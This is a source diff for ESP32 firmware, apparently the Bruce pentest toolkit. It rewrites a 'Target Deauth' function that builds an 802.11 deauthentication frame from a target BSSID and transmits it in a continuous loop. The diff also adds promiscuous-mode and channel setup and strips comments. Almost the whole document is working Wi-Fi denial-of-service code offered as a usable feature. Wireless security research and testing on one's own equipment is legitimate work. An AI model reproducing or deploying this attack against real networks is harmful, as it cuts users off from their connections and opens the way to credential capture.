@@ -155,7 +155,7 @@ void resetGlobalState() {
 ***************************************************************************************/
 void send_raw_frame(const uint8_t *frame_buffer, int size) {
     esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
-    vTaskDelay(1 / portTICK_RATE_MS);
+    vTaskDelay(1 / portTICK_PERIOD_MS);
     esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
     vTaskDelay(1 / portTICK_PERIOD_MS);
     esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
@@ -743,18 +743,25 @@ AGAIN:
 ***************************************************************************************/
 void target_atk(String tssid, String mac, uint8_t channel) {
     resetGlobalState();
-    // Stop WebUI before setting WiFi mode for attack
     cleanlyStopWebUiForWiFiFeature();
-    if (!wifi_atk_setWifi()) return;
 
-    // Prepare deauth frame
+    wifi_complete_cleanup();
+    delay(100);
+    WiFi.mode(WIFI_AP);
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+
+    uint8_t bssid[6];
+    sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+           &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
+
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-    wsl_bypasser_send_raw_frame(&ap_record, channel, _default_target);
+    memcpy(&deauth_frame[4], _default_target, 6);
+    memcpy(&deauth_frame[10], bssid, 6);
+    memcpy(&deauth_frame[16], bssid, 6);
 
-    // Attack loop variables
     const uint16_t UPDATE_INTERVAL_MS = 2000;
     const uint8_t FRAMES_PER_SEND = 3;
-
     uint32_t lastUpdateTime = millis();
     uint32_t frameCount = 0;
     bool needsRedraw = true;
@@ -766,15 +773,9 @@ void target_atk(String tssid, String mac, uint8_t channel) {
     setCpuFrequencyMhz(CONFIG_ESP_DEFAULT_CPU_FREQ_MHZ);
 
     while (attackActive) {
-        // Render UI if needed
         if (needsRedraw) {
             drawMainBorderWithTitle("Target Deauth");
             tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-
-            // Dynamic vertical spacing based on screen height
-            uint16_t lineHeight = tftHeight / 20;
-            uint16_t startY = lineHeight * 3;
-
             padprintln("");
             padprintln("AP: " + tssid);
             padprintln("Channel: " + String(channel));
@@ -783,34 +784,24 @@ void target_atk(String tssid, String mac, uint8_t channel) {
             needsRedraw = false;
         }
 
-        // Send deauth frame
         send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
         frameCount += FRAMES_PER_SEND;
 
-        // Update FPS counter periodically
         uint32_t currentTime = millis();
         if (currentTime - lastUpdateTime >= UPDATE_INTERVAL_MS) {
-            // Calculate dynamic position for status text
             uint16_t statusX = tftWidth * 0.05;
             uint16_t statusY = tftHeight - (tftHeight * 0.08);
-
             tft.setCursor(statusX, statusY);
-
-            // Calculate frames per second correctly
             float fps = (frameCount * 1000.0) / (currentTime - lastUpdateTime);
             tft.print("Frames: " + String((int)fps) + "/s   ");
-
             frameCount = 0;
             lastUpdateTime = currentTime;
         }
 
-        // Handle pause/resume
         if (check(SelPress) || EscPress) {
             EscPress = false;
             displayTextLine("Deauth Paused");
             delay(500);
-
-            // Wait for user input
             while (!check(SelPress)) {
                 vTaskDelay(10 / portTICK_PERIOD_MS);
                 if (check(EscPress)) {
@@ -819,9 +810,11 @@ void target_atk(String tssid, String mac, uint8_t channel) {
                 }
             }
             needsRedraw = true;
+    
         }
     }
 
+    esp_wifi_set_promiscuous(false);
     wifi_atk_unsetWifi();
     returnToMenu = true;
 }
